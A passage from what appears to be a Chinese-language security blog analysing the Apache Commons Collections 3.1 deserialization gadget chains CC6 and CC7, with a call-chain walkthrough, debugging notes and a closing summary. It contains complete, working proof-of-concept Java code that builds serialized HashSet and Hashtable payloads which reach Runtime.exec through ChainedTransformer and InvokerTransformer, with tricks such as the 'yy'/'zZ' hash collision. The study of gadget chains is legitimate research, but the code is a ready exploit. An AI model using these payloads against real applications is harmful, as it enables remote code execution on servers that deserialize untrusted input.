    f.setAccessible(true);
    f.set(transformerChain, transformers);
通过反射获取`ChainedTransformer`的`iTransformers`变量，将含有我们反序列化时要执行的命令的`transformers`数组传进去，替换前面的`fakeTransformers`；
完整POC：
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.util.HashSet;
    import java.util.Map;
    public class CC6 {
        public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, NoSuchFieldException {
            Transformer[] fakeTransformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] { String.class}, new String[] {"notepad.exe"}),
                    };
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] { String.class}, new String[] {"calc.exe"}),
            };
            Transformer transformerChain = new ChainedTransformer(fakeTransformers);
            Map innerMap = new HashMap();
            Map outerMap = LazyMap.decorate(innerMap, transformerChain);
            TiedMapEntry tiedmap = new TiedMapEntry(outerMap,"foo");
            HashSet hashset = new HashSet();
            hashset.add(tiedmap);
            outerMap.remove("foo");
            Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
            f.setAccessible(true);
            f.set(transformerChain, transformers);
            try{
                ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc6.bin"));
                outputStream.writeObject(hashset);
                outputStream.close();
                ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc6.bin"));
                inputStream.readObject();
            }catch(Exception e){
                e.printStackTrace();
            }
        }
    }
### POC调试
从`HashMap#readObject`开始，调用了`put`；  
调用链和`add()`差不多，直接跟到InvokerTransformer；  
命令执行成功；  
## CC7
### 前言
CC7也是对CC3.1版本的利用链，使用`Hashtable`作为反序列化的入口点，通过`AbstractMap#equals`来调用`LazyMap#get`。
**环境搭建**
  * JDK 1.8
  * Commons Collections 3.1
pom.xml中添加：
            commons-collections
            commons-collections
            3.1
**利用链**
    java.util.Hashtable.readObject
    java.util.Hashtable.reconstitutionPut
    org.apache.commons.collections.map.AbstractMapDecorator.equals
    java.util.AbstractMap.equals
    org.apache.commons.collections.map.LazyMap.get
    org.apache.commons.collections.functors.ChainedTransformer.transform
    org.apache.commons.collections.functors.InvokerTransformer.transform
    java.lang.reflect.Method.invoke
    sun.reflect.DelegatingMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke0
    java.lang.Runtime.exec
### 利用链分析
看到`Hashtable#readObject`，循环调用了`reconstitutionPut`，`elements`为传入的元素个数；  
key和value都是从序列化流中得到的，序列化流中的值则是通过`put`传进去的；  
跟进`reconstitutionPut`；  
for循环中调用了`equals`，我们先看看进入for循环的条件：`e != null`，而`e =
tab[index]`，此时`tab[index]`的值是为null的，所以不会进入for循环，下面的代码就是将key和value添加到tab中；
那如何才能进入for循环呢，既然调用一次`reconstitutionPut`不行，那我们就调用两次，也就是说put两个元素进`Hashtable`对象，这样`elements`的值就为2，readObject中的for循环就可以循环两次；  
第一次循环已经将第一组key和value传入到tab中了，当第二次到达`reconstitutionPut`中的for循环的时候，`tab[index]`中已经有了第一次调用时传入的值，所以不为null，可以进入for循环；
接着看看if里面的判断，要求`e.hash ==
hash`，这里的`e`值为`tab[index]`，也就是第一组传入的值，这里的`hash`是通过`key.hashCode()`获取的，也就是说要put两个hash值相等的元素进去才行；
继续跟进到`AbstractMapDecorator#equals`，这里的`map`是可控的，；  
跟进到`AbstractMap#equals`，调用了`m.get()`，而`m`是根据传入的对象获取的，也就是说如果传入的是`LazyMap`类对象，那么这里就是调用的`LazyMap#get`，便可触发RCE；  
### POC分析
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.util.Hashtable;
    import java.util.Map;
    public class CC7 {
        public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException {
            Transformer[] fakeTransformers = new Transformer[] {};
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] { String.class}, new String[] {"calc.exe"}),
            };
            Transformer transformerChain = new ChainedTransformer(fakeTransformers);
            Map innerMap1 = new HashMap();
            Map innerMap2 = new HashMap();
            Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
            lazyMap1.put("yy", 1);
            Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
            lazyMap2.put("zZ", 1);
            Hashtable hashtable = new Hashtable();
            hashtable.put(lazyMap1, 1);
            hashtable.put(lazyMap2, 2);
            Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
            f.setAccessible(true);
            f.set(transformerChain, transformers);
            lazyMap2.remove("yy");
            try{
                ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc7.bin"));
                outputStream.writeObject(hashtable);
                outputStream.close();
                ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc7.bin"));
                inputStream.readObject();
            }catch(Exception e){
                e.printStackTrace();
            }
        }
    }
**代码1**
    Transformer[] fakeTransformers = new Transformer[] {};
    Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
            new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
            new InvokerTransformer("exec", new Class[] { String.class}, new String[] {"calc.exe"}),
    };
和CC6一样，需要构造两个Transformer数组，因为在后面第二次调用`hashtable.put()`的时候也会调用到`LazyMap#get`，会触发RCE，可以跟进看一调用栈；  
所以这里构造一个`fakeTransformers`，里面为空就行；
**代码2**
    Transformer transformerChain = new ChainedTransformer(fakeTransformers);
    Map innerMap1 = new HashMap();
    Map innerMap2 = new HashMap();
    Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
    lazyMap1.put("yy", 1);
    Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
    lazyMap2.put("zZ", 1);
    Hashtable hashtable = new Hashtable();
    hashtable.put(lazyMap1, 1);
    hashtable.put(lazyMap2, 2);
先将`fakeTransformers`传入`ChainedTransformer`对象；  
new两个`HashMap`对象，都调用`LazyMap.decorate`，并且分别向两个对象中传值，两个key值分别为`yy`和`zZ`，因为需要这两个值的hash值相等，而在java中，`yy`和`zZ`的hash值恰好相等；  
然后将这两个LazyMap类对象put进Hashtable类对象；
**代码3**
    Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
    f.setAccessible(true);
    f.set(transformerChain, transformers);
    lazyMap2.remove("yy");
通过反射获取`ChainedTransformer`的`iTransformers`变量，将含有我们反序列化时要执行的命令的`transformers`数组传进去，替换前面的`fakeTransformers`；
最后还要remove掉`yy`，应为如果不去掉的话，第二次调用`reconstitutionPut`的时候就会存在两个key；  
导致进入下面的if判断，直接返回false，不再执行后面的代码；  
### POC调试
第一次进入`reconstitutionPut`，将值传入tab：  
第二次进入for循环：  
进入`equals`，参数`object`是lazyMap2：  
进入下一个`equals`，`m`就是`LazyMap`类：  
进入`get`，成功调用`transform()`：  
命令执行成功；  
参考链接：  
## 总结
CC链就先分析到这里，8、9、10等剩下的链以后再接着分析；  
CC链1-7涉及两个CC版本，3.1和4.0；  
3.1版本基本就是通过各种途径去调用`LazyMap#get`，从而实现RCE；  
4.0版本则是通过调用`TransformingComparator#compare`来实现RCE；  
相同点都在于是为了调用`transform()`；  
虽然几条链分析下来都大同小异，但也提升了不少分析代码的能力，获益匪浅。